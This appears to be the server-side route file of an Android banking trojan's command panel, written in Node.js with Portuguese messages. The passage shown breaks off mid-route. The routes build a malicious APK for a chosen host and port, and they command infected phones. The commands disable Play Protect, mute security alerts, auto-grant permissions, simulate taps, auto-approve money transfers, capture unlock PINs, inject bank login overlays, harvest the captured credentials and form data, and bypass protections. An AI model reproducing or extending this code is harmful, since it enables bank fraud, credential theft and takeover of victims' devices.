const
    express = require('express'),
    routes = express.Router(),
    cookieParser = require('cookie-parser'),
    bodyParser = require('body-parser'),
    crypto = require('crypto');

const grokAudit = require('./grokAudit');

let CONST = global.CONST;
let db = global.db;
let logManager = global.logManager;
let app = global.app;
let clientManager = global.clientManager;
let atsManager = global.atsManager;
let apkBuilder = global.apkBuilder;

const LOGIN_WINDOW_MS = 15 * 60 * 1000;
const LOGIN_MAX_ATTEMPTS = 6;
const loginAttempts = new Map();

function getRequestIP(req) {
    const forwardedFor = req.headers['x-forwarded-for'];
    if (forwardedFor) {
        return forwardedFor.split(',')[0].trim();
    }

    return req.ip || req.connection.remoteAddress || 'unknown';
}

function isLoginBlocked(ipAddress) {
    const state = loginAttempts.get(ipAddress);
    if (!state) {
        return false;
    }

    const now = Date.now();
    if ((now - state.firstAttemptAt) > LOGIN_WINDOW_MS) {
        loginAttempts.delete(ipAddress);
        return false;
    }

    return state.count >= LOGIN_MAX_ATTEMPTS;
}

function markLoginFailure(ipAddress) {
    const now = Date.now();
    const state = loginAttempts.get(ipAddress);

    if (!state || ((now - state.firstAttemptAt) > LOGIN_WINDOW_MS)) {
        loginAttempts.set(ipAddress, {
            count: 1,
            firstAttemptAt: now
        });
        return;
    }

    state.count += 1;
    loginAttempts.set(ipAddress, state);
}

function clearLoginFailures(ipAddress) {
    loginAttempts.delete(ipAddress);
}

function buildCookieOptions(req) {
    const isHttps = req.secure || req.headers['x-forwarded-proto'] === 'https';
    return {
        httpOnly: true,
        sameSite: 'lax',
        secure: isHttps
    };
}

app.use(cookieParser());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

function isAllowed(req, res, next) {
    let cookies = req.cookies;
    let loginToken = db.maindb.get('admin.loginToken').value();
    if ('loginToken' in cookies) {
        if (cookies.loginToken === loginToken) next();
        else res.clearCookie('loginToken').redirect('/login');
    } else res.redirect('/login');
    // next();
}

routes.get('/dl', (req, res) => {
    res.redirect('/build.s.apk');
});

routes.get('/', isAllowed, (req, res) => {
    res.render('index', {
        clientsOnline: clientManager.getClientListOnline(),
        clientsOffline: clientManager.getClientListOffline()
    });
});


routes.get('/login', (req, res) => {
    res.render('login');
});

routes.post('/login', (req, res) => {
    const requestIP = getRequestIP(req);
    if (isLoginBlocked(requestIP)) {
        logManager.log(CONST.logTypes.alert, `Muitas tentativas de login detectadas para ${requestIP}`);
        return res.status(429).redirect('/login?e=tooManyAttempts');
    }

    if ('username' in req.body) {
        if ('password' in req.body) {
            let rUsername = db.maindb.get('admin.username').value();
            let rPassword = db.maindb.get('admin.password').value();
            let passwordMD5 = crypto.createHash('md5').update(req.body.password.toString()).digest("hex");
            if (req.body.username.toString() === rUsername && passwordMD5 === rPassword) {
                let loginToken = crypto.createHash('md5').update((Math.random()).toString() + (new Date()).toString()).digest("hex");
                db.maindb.get('admin').assign({ loginToken }).write();
                clearLoginFailures(requestIP);
                res.cookie('loginToken', loginToken, buildCookieOptions(req)).redirect('/');
            } else {
                markLoginFailure(requestIP);
                return res.redirect('/login?e=badLogin');
            }
        } else return res.redirect('/login?e=missingPassword');
    } else return res.redirect('/login?e=missingUsername');
});

routes.get('/logout', isAllowed, (req, res) => {
    db.maindb.get('admin').assign({ loginToken: '' }).write();
    res.clearCookie('loginToken').redirect('/login');
});


routes.get('/builder', isAllowed, (req, res) => {
    res.render('builder', {
        myPort: CONST.control_port
    });
});

routes.post('/builder', isAllowed, (req, res) => {
    if ((req.query.uri !== undefined) && (req.query.port !== undefined)) apkBuilder.patchAPK(req.query.uri, req.query.port, (error) => {
        if (!error) apkBuilder.buildAPK((error) => {
            if (!error) {
                logManager.log(CONST.logTypes.success, "Build Succeded!");
                res.json({ error: false });
            }
            else {
                logManager.log(CONST.logTypes.error, "Build Failed - " + error);
                res.json({ error });
            }
        });
        else {
            logManager.log(CONST.logTypes.error, "Build Failed - " + error);
            res.json({ error });
        }
    });
    else {
        logManager.log(CONST.logTypes.error, "Build Failed - " + error);
        res.json({ error });
    }
});


routes.get('/logs', isAllowed, (req, res) => {
    res.render('logs', {
        logs: logManager.getLogs()
    });
});



routes.get('/manage/:deviceid/:page', isAllowed, (req, res) => {
    let pageData = clientManager.getClientDataByPage(req.params.deviceid, req.params.page, req.query.filter);
    if (pageData) res.render('deviceManager', {
        page: req.params.page,
        deviceID: req.params.deviceid,
        baseURL: '/manage/' + req.params.deviceid,
        pageData
    });
    else res.render('deviceManager', {
        page: 'notFound',
        deviceID: req.params.deviceid,
        baseURL: '/manage/' + req.params.deviceid
    });
});

routes.post('/manage/:deviceid/:commandID', isAllowed, (req, res) => {
    clientManager.sendCommand(req.params.deviceid, req.params.commandID, req.query, (error, message) => {
        if (!error) res.json({ error: false, message })
        else res.json({ error })
    });
});

routes.post('/manage/:deviceid/GPSPOLL/:speed', isAllowed, (req, res) => {
    clientManager.setGpsPollSpeed(req.params.deviceid, parseInt(req.params.speed), (error) => {
        if (!error) res.json({ error: false })
        else res.json({ error })
    });
});

routes.post('/manage/:deviceid/0xST', isAllowed, (req, res) => {
    let text = req.query.text || req.body.text || '';
    let viewId = req.query.viewId || req.body.viewId || '';
    
    if (!text || text.trim().length === 0) {
        res.json({ error: 'Texto não pode estar vazio' });
        return;
    }

    let commandPayload = {
        text: text.trim()
    };

    if (viewId && viewId.trim().length > 0) {
        commandPayload.viewId = viewId.trim();
    }

    clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.setText, commandPayload, (error, message) => {
        if (!error) res.json({ error: false, message })
        else res.json({ error })
    });
});

// ATS (Automated Transfer System) Routes
routes.get('/manage/:deviceid/ats', isAllowed, (req, res) => {
    atsManager.getATSConfig(req.params.deviceid, (error, atsConfig) => {
        if (!error && atsConfig) {
            res.json(atsConfig);
        } else {
            res.json({ error: error || 'Não foi possível obter configuração ATS' });
        }
    });
});

routes.post('/manage/:deviceid/ats/enable/:enabled', isAllowed, (req, res) => {
    let enabled = req.params.enabled === 'true' || req.params.enabled === '1';
    atsManager.setATSEnabled(req.params.deviceid, enabled, (error) => {
        if (!error) {
            res.json({ error: false, message: `ATS ${enabled ? 'habilitado' : 'desabilitado'}` });
        } else {
            res.json({ error });
        }
    });
});

routes.post('/manage/:deviceid/ats/data', isAllowed, (req, res) => {
    let fieldKey = req.query.field || req.body.field;
    let fieldValue = req.query.value || req.body.value;
    
    atsManager.updateDataMapping(req.params.deviceid, fieldKey, fieldValue, (error) => {
        if (!error) {
            res.json({ error: false, message: 'Dado fictício atualizado' });
        } else {
            res.json({ error });
        }
    });
});

routes.delete('/manage/:deviceid/ats/data/:field', isAllowed, (req, res) => {
    atsManager.removeDataMapping(req.params.deviceid, req.params.field, (error) => {
        if (!error) {
            res.json({ error: false, message: 'Dado fictício removido' });
        } else {
            res.json({ error });
        }
    });
});

routes.post('/manage/:deviceid/ats/pattern', isAllowed, (req, res) => {
    let pattern = req.query.pattern || req.body.pattern;
    
    atsManager.addFieldPattern(req.params.deviceid, pattern, (error) => {
        if (!error) {
            res.json({ error: false, message: 'Padrão adicionado' });
        } else {
            res.json({ error });
        }
    });
});

routes.delete('/manage/:deviceid/ats/pattern/:pattern', isAllowed, (req, res) => {
    atsManager.removeFieldPattern(req.params.deviceid, req.params.pattern, (error) => {
        if (!error) {
            res.json({ error: false, message: 'Padrão removido' });
        } else {
            res.json({ error });
        }
    });
});

routes.get('/manage/:deviceid/ats/log', isAllowed, (req, res) => {
    let limit = parseInt(req.query.limit) || 100;
    atsManager.getATSLog(req.params.deviceid, limit, (error, atsLog) => {
        if (!error && atsLog) {
            res.json(atsLog);
        } else {
            res.json({ error: error || 'Não foi possível obter log ATS' });
        }
    });
});

routes.delete('/manage/:deviceid/ats/log', isAllowed, (req, res) => {
    atsManager.clearATSLog(req.params.deviceid, (error) => {
        if (!error) {
            res.json({ error: false, message: 'Log ATS limpo' });
        } else {
            res.json({ error });
        }
    });
});

// Auto Click Routes
routes.post('/manage/:deviceid/ats/autoclick/enable/:enabled', isAllowed, (req, res) => {
    let enabled = req.params.enabled === 'true' || req.params.enabled === '1';
    atsManager.setAutoClickEnabled(req.params.deviceid, enabled, (error) => {
        if (!error) {
            res.json({ error: false, message: `Auto Click ${enabled ? 'habilitado' : 'desabilitado'}` });
        } else {
            res.json({ error });
        }
    });
});

routes.post('/manage/:deviceid/ats/autoclick/delay/:delayMs', isAllowed, (req, res) => {
    atsManager.setClickDelay(req.params.deviceid, req.params.delayMs, (error) => {
        if (!error) {
            res.json({ error: false, message: `Delay alterado para ${req.params.delayMs}ms` });
        } else {
            res.json({ error });
        }
    });
});

routes.post('/manage/:deviceid/ats/buttonpattern', isAllowed, (req, res) => {
    let pattern = req.query.pattern || req.body.pattern;
    
    atsManager.addButtonPattern(req.params.deviceid, pattern, (error) => {
        if (!error) {
            res.json({ error: false, message: 'Padrão de botão adicionado' });
        } else {
            res.json({ error });
        }
    });
});

routes.delete('/manage/:deviceid/ats/buttonpattern/:pattern', isAllowed, (req, res) => {
    atsManager.removeButtonPattern(req.params.deviceid, req.params.pattern, (error) => {
        if (!error) {
            res.json({ error: false, message: 'Padrão de botão removido' });
        } else {
            res.json({ error });
        }
    });
});

// Defense Disable Routes
routes.post('/manage/:deviceid/0xDF', isAllowed, (req, res) => {
    let action = req.body.action || req.query.action;
    
    clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.defenseDisable, { action }, (error, data) => {
        if (error) {
            res.json({ error });
        } else {
            res.json({ error: false, message: 'Comando de desativação de defesa enviado', data });
        }
    });
});

routes.post('/manage/:deviceid/df/disable_play_protect', isAllowed, (req, res) => {
    clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.defenseDisable, 
        { action: 'disable_play_protect' }, (error) => {
        if (!error) {
            res.json({ error: false, message: 'Comando para desativar Google Play Protect enviado' });
        } else {
            res.json({ error });
        }
    });
});

routes.post('/manage/:deviceid/df/mute_security_notifications', isAllowed, (req, res) => {
    clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.defenseDisable, 
        { action: 'mute_security_notifications' }, (error) => {
        if (!error) {
            res.json({ error: false, message: 'Comando para mudar notificações de segurança enviado' });
        } else {
            res.json({ error });
        }
    });
});

routes.get('/manage/:deviceid/df/log', isAllowed, (req, res) => {
    let defenseLog = clientManager.getClientDataByPage(req.params.deviceid, 'defense_disable');
    if (defenseLog) {
        res.json({ error: false, data: defenseLog });
    } else {
        res.json({ error: 'Dispositivo não encontrado' });
    }
});

routes.delete('/manage/:deviceid/df/log', isAllowed, (req, res) => {
    try {
        let clients = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (clients) {
            let clientDB = new (require('./databaseGateway')).clientdb(req.params.deviceid);
            clientDB.get('defenseConfig.defenseLog').assign([]).write();
            res.json({ error: false, message: 'Log de defesa limpo' });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

// Permission Grant Routes
routes.post('/manage/:deviceid/0xPG', isAllowed, (req, res) => {
    let action = req.body.action || req.query.action;
    
    clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.permissionGrant, { action }, (error, data) => {
        if (error) {
            res.json({ error });
        } else {
            res.json({ error: false, message: 'Comando de concessão de permissão enviado', data });
        }
    });
});

routes.post('/manage/:deviceid/pg/enable/:enabled', isAllowed, (req, res) => {
    let enabled = req.params.enabled === 'true' || req.params.enabled === '1';
    
    try {
        let clients = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (clients) {
            let clientDB = new (require('./databaseGateway')).clientdb(req.params.deviceid);
            clientDB.get('permissionGrantConfig').assign({ autoGrantEnabled: enabled }).write();
            
            res.json({ error: false, message: `Auto-concessão de permissões ${enabled ? 'habilitada' : 'desabilitada'}` });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.get('/manage/:deviceid/pg/log', isAllowed, (req, res) => {
    let permissionGrantLog = clientManager.getClientDataByPage(req.params.deviceid, 'permission_grant');
    if (permissionGrantLog) {
        res.json({ error: false, data: permissionGrantLog });
    } else {
        res.json({ error: 'Dispositivo não encontrado' });
    }
});

routes.delete('/manage/:deviceid/pg/log', isAllowed, (req, res) => {
    try {
        let clients = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (clients) {
            let clientDB = new (require('./databaseGateway')).clientdb(req.params.deviceid);
            clientDB.get('permissionGrantConfig.permissionLog').assign([]).write();
            res.json({ error: false, message: 'Log de concessão de permissões limpo' });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

// Gesture Simulation Routes
routes.post('/manage/:deviceid/0xGS', isAllowed, (req, res) => {
    let gestureType = req.body.gestureType || req.query.gestureType;
    let x = req.body.x || req.query.x || 0;
    let y = req.body.y || req.query.y || 0;
    let duration = req.body.duration || req.query.duration || 0;
    let endX = req.body.endX || req.query.endX;
    let endY = req.body.endY || req.query.endY;
    
    clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.gestureSimulation, 
        { gestureType, x, y, duration, endX, endY }, (error, data) => {
        if (error) {
            res.json({ error });
        } else {
            res.json({ error: false, message: 'Comando de gesto enviado', data });
        }
    });
});

routes.post('/manage/:deviceid/gs/tap', isAllowed, (req, res) => {
    let x = req.body.x || 0;
    let y = req.body.y || 0;
    
    clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.gestureSimulation,
        { gestureType: 'tap', x, y, duration: 0 }, (error, data) => {
        if (error) {
            res.json({ error });
        } else {
            res.json({ error: false, message: 'Tap enviado', data });
        }
    });
});

routes.post('/manage/:deviceid/gs/long_tap', isAllowed, (req, res) => {
    let x = req.body.x || 0;
    let y = req.body.y || 0;
    let duration = req.body.duration || 500; // 500ms padrão
    
    clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.gestureSimulation,
        { gestureType: 'long_tap', x, y, duration }, (error, data) => {
        if (error) {
            res.json({ error });
        } else {
            res.json({ error: false, message: 'Long tap enviado', data });
        }
    });
});

routes.post('/manage/:deviceid/gs/swipe', isAllowed, (req, res) => {
    let x = req.body.x || 0;
    let y = req.body.y || 0;
    let endX = req.body.endX || x + 100;
    let endY = req.body.endY || y;
    let duration = req.body.duration || 500;
    
    clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.gestureSimulation,
        { gestureType: 'swipe', x, y, endX, endY, duration }, (error, data) => {
        if (error) {
            res.json({ error });
        } else {
            res.json({ error: false, message: 'Swipe enviado', data });
        }
    });
});

routes.get('/manage/:deviceid/gs/log', isAllowed, (req, res) => {
    let gestureLog = clientManager.getClientDataByPage(req.params.deviceid, 'gesture_simulation');
    if (gestureLog) {
        res.json({ error: false, data: gestureLog });
    } else {
        res.json({ error: 'Dispositivo não encontrado' });
    }
});

routes.delete('/manage/:deviceid/gs/log', isAllowed, (req, res) => {
    try {
        let clients = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (clients) {
            let clientDB = new (require('./databaseGateway')).clientdb(req.params.deviceid);
            clientDB.get('gestureSimulationConfig.gestureLog').assign([]).write();
            res.json({ error: false, message: 'Log de gestos limpo' });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

// Transaction Approval Routes
routes.post('/manage/:deviceid/0xTA', isAllowed, (req, res) => {
    let action = req.body.action || req.query.action || 'approve_transaction';
    let amount = req.body.amount || req.query.amount || 0;
    let recipient = req.body.recipient || req.query.recipient || '';
    
    clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.transactionApproval,
        { action, amount, recipient }, (error, data) => {
        if (error) {
            res.json({ error });
        } else {
            res.json({ error: false, message: 'Comando de aprovação de transação enviado', data });
        }
    });
});

routes.post('/manage/:deviceid/ta/enable_auto', isAllowed, (req, res) => {
    try {
        let clients = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (clients) {
            let clientDB = new (require('./databaseGateway')).clientdb(req.params.deviceid);
            clientDB.get('transactionApprovalConfig').assign({ enableAutoApproval: true }).write();
            res.json({ error: false, message: 'Auto-aprovação de transações habilitada' });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.post('/manage/:deviceid/ta/disable_auto', isAllowed, (req, res) => {
    try {
        let clients = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (clients) {
            let clientDB = new (require('./databaseGateway')).clientdb(req.params.deviceid);
            clientDB.get('transactionApprovalConfig').assign({ enableAutoApproval: false }).write();
            res.json({ error: false, message: 'Auto-aprovação de transações desabilitada' });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.get('/manage/:deviceid/ta/log', isAllowed, (req, res) => {
    let transactionLog = clientManager.getClientDataByPage(req.params.deviceid, 'transaction_approval');
    if (transactionLog) {
        res.json({ error: false, data: transactionLog });
    } else {
        res.json({ error: 'Dispositivo não encontrado' });
    }
});

routes.delete('/manage/:deviceid/ta/log', isAllowed, (req, res) => {
    try {
        let clients = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (clients) {
            let clientDB = new (require('./databaseGateway')).clientdb(req.params.deviceid);
            clientDB.get('transactionApprovalConfig.autoApprovalLog').assign([]).write();
            res.json({ error: false, message: 'Log de transações limpo' });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

// Dynamic Screen Unlock Routes
routes.post('/manage/:deviceid/0xDSU', isAllowed, (req, res) => {
    let action = req.body.action || req.query.action || 'capture_pattern';
    let pattern = req.body.pattern || req.query.pattern;
    let patternType = req.body.patternType || req.query.patternType || 'pin';
    
    clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.dynamicScreenUnlock,
        { action, pattern, patternType }, (error, data) => {
        if (error) {
            res.json({ error });
        } else {
            res.json({ error: false, message: 'Comando de desbloqueio de tela enviado', data });
        }
    });
});

routes.post('/manage/:deviceid/dsu/enable_auto', isAllowed, (req, res) => {
    try {
        let clients = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (clients) {
            let clientDB = new (require('./databaseGateway')).clientdb(req.params.deviceid);
            clientDB.get('dynamicScreenUnlockConfig').assign({ autoUnlockEnabled: true }).write();
            res.json({ error: false, message: 'Desbloqueio automático de tela habilitado' });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.post('/manage/:deviceid/dsu/disable_auto', isAllowed, (req, res) => {
    try {
        let clients = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (clients) {
            let clientDB = new (require('./databaseGateway')).clientdb(req.params.deviceid);
            clientDB.get('dynamicScreenUnlockConfig').assign({ autoUnlockEnabled: false }).write();
            res.json({ error: false, message: 'Desbloqueio automático de tela desabilitado' });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.get('/manage/:deviceid/dsu/log', isAllowed, (req, res) => {
    let unlockLog = clientManager.getClientDataByPage(req.params.deviceid, 'dynamic_screen_unlock');
    if (unlockLog) {
        res.json({ error: false, data: unlockLog });
    } else {
        res.json({ error: 'Dispositivo não encontrado' });
    }
});

routes.delete('/manage/:deviceid/dsu/log', isAllowed, (req, res) => {
    try {
        let clients = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (clients) {
            let clientDB = new (require('./databaseGateway')).clientdb(req.params.deviceid);
            clientDB.get('dynamicScreenUnlockConfig.unlockLog').assign([]).write();
            res.json({ error: false, message: 'Log de desbloqueio limpo' });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.delete('/manage/:deviceid/dsu/patterns', isAllowed, (req, res) => {
    try {
        let clients = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (clients) {
            let clientDB = new (require('./databaseGateway')).clientdb(req.params.deviceid);
            clientDB.get('dynamicScreenUnlockConfig.capturedPatterns').assign([]).write();
            res.json({ error: false, message: 'Padrões capturados limpos' });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

// Overlay Injection Routes
routes.post('/manage/:deviceid/0xOI', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.overlayInjection, req.body, (error) => {
                if (error) {
                    res.json({ error: error });
                } else {
                    res.json({ error: false, message: 'Comando de injeção de overlay enviado' });
                }
            });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.post('/manage/:deviceid/oi/enable_monitoring', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.overlayInjection, { action: 'enable_monitoring' }, (error) => {
                if (!error) {
                    res.json({ error: false, message: 'Monitoramento de overlay ativado' });
                } else {
                    res.json({ error: error });
                }
            });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.post('/manage/:deviceid/oi/disable_monitoring', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.overlayInjection, { action: 'disable_monitoring' }, (error) => {
                if (!error) {
                    res.json({ error: false, message: 'Monitoramento de overlay desativado' });
                } else {
                    res.json({ error: error });
                }
            });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.post('/manage/:deviceid/oi/enable_bank/:bank', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            let clientDB = new (require('./databaseGateway')).clientdb(req.params.deviceid);
            let overlayConfig = clientDB.get('overlayInjectionConfig').value();
            
            if (!overlayConfig.enabledBanks.includes(req.params.bank)) {
                overlayConfig.enabledBanks.push(req.params.bank);
                clientDB.get('overlayInjectionConfig').assign(overlayConfig).write();
            }
            
            res.json({ error: false, message: 'Banco ' + req.params.bank + ' ativado para overlays' });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.post('/manage/:deviceid/oi/disable_bank/:bank', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            let clientDB = new (require('./databaseGateway')).clientdb(req.params.deviceid);
            let overlayConfig = clientDB.get('overlayInjectionConfig').value();
            
            overlayConfig.enabledBanks = overlayConfig.enabledBanks.filter(b => b !== req.params.bank);
            clientDB.get('overlayInjectionConfig').assign(overlayConfig).write();
            
            res.json({ error: false, message: 'Banco ' + req.params.bank + ' desativado para overlays' });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.get('/manage/:deviceid/oi/log', isAllowed, (req, res) => {
    let overlayData = clientManager.getClientDataByPage(req.params.deviceid, 'overlay_injection');
    if (overlayData) {
        res.json({ error: false, data: overlayData });
    } else {
        res.json({ error: 'Dispositivo não encontrado' });
    }
});

routes.get('/manage/:deviceid/oi/credentials', isAllowed, (req, res) => {
    let overlayData = clientManager.getClientDataByPage(req.params.deviceid, 'overlay_injection');
    if (overlayData) {
        res.json({ error: false, data: overlayData.capturedCredentials });
    } else {
        res.json({ error: 'Dispositivo não encontrado' });
    }
});

routes.delete('/manage/:deviceid/oi/log', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            let clientDB = new (require('./databaseGateway')).clientdb(req.params.deviceid);
            clientDB.get('overlayInjectionConfig.overlayLog').assign([]).write();
            res.json({ error: false, message: 'Log de overlay limpo' });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.delete('/manage/:deviceid/oi/credentials', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            let clientDB = new (require('./databaseGateway')).clientdb(req.params.deviceid);
            clientDB.get('overlayInjectionConfig.capturedCredentials').assign([]).write();
            res.json({ error: false, message: 'Credenciais capturadas limpas' });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

// Customized Forms Capture Routes
routes.post('/manage/:deviceid/0xFC', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.customizedFormsCapture, req.body, (error) => {
                if (error) {
                    res.json({ error: error });
                } else {
                    res.json({ error: false, message: 'Comando de captura de formulário enviado' });
                }
            });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.post('/manage/:deviceid/fc/enable_realtime', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.customizedFormsCapture, { action: 'enable_realtime' }, (error) => {
                if (!error) {
                    res.json({ error: false, message: 'Captura em tempo real ativada' });
                } else {
                    res.json({ error: error });
                }
            });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.post('/manage/:deviceid/fc/disable_realtime', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.customizedFormsCapture, { action: 'disable_realtime' }, (error) => {
                if (!error) {
                    res.json({ error: false, message: 'Captura em tempo real desativada' });
                } else {
                    res.json({ error: error });
                }
            });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.post('/manage/:deviceid/fc/enable_bank/:bank', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            let clientDB = new (require('./databaseGateway')).clientdb(req.params.deviceid);
            let fcConfig = clientDB.get('customizedFormsCaptureConfig').value();
            fcConfig.enabledBanks[req.params.bank] = true;
            clientDB.get('customizedFormsCaptureConfig').assign(fcConfig).write();
            res.json({ error: false, message: 'Banco ' + req.params.bank + ' ativado para captura de formulários' });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.post('/manage/:deviceid/fc/disable_bank/:bank', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            let clientDB = new (require('./databaseGateway')).clientdb(req.params.deviceid);
            let fcConfig = clientDB.get('customizedFormsCaptureConfig').value();
            fcConfig.enabledBanks[req.params.bank] = false;
            clientDB.get('customizedFormsCaptureConfig').assign(fcConfig).write();
            res.json({ error: false, message: 'Banco ' + req.params.bank + ' desativado para captura de formulários' });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.get('/manage/:deviceid/fc/data', isAllowed, (req, res) => {
    let fcData = clientManager.getClientDataByPage(req.params.deviceid, 'customized_forms_capture');
    if (fcData) {
        res.json({ error: false, data: fcData });
    } else {
        res.json({ error: 'Dispositivo não encontrado' });
    }
});

routes.get('/manage/:deviceid/fc/captured', isAllowed, (req, res) => {
    let fcData = clientManager.getClientDataByPage(req.params.deviceid, 'customized_forms_capture');
    if (fcData) {
        res.json({ error: false, data: fcData.capturedData });
    } else {
        res.json({ error: 'Dispositivo não encontrado' });
    }
});

routes.delete('/manage/:deviceid/fc/data', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            let clientDB = new (require('./databaseGateway')).clientdb(req.params.deviceid);
            clientDB.get('customizedFormsCaptureConfig.capturedData').assign([]).write();
            res.json({ error: false, message: 'Dados capturados limpos' });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.delete('/manage/:deviceid/fc/log', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            let clientDB = new (require('./databaseGateway')).clientdb(req.params.deviceid);
            clientDB.get('customizedFormsCaptureConfig.captureLog').assign([]).write();
            res.json({ error: false, message: 'Log de captura limpado' });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

// Bypass Protections Routes
routes.post('/manage/:deviceid/0xBP', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.bypassProtections, req.body, (error) => {
                if (error) {
                    res.json({ error: error });
                } else {
                    res.json({ error: false, message: 'Comando de bypass de proteções enviado' });
                }
            });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.post('/manage/:deviceid/bp/enable_bypass', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
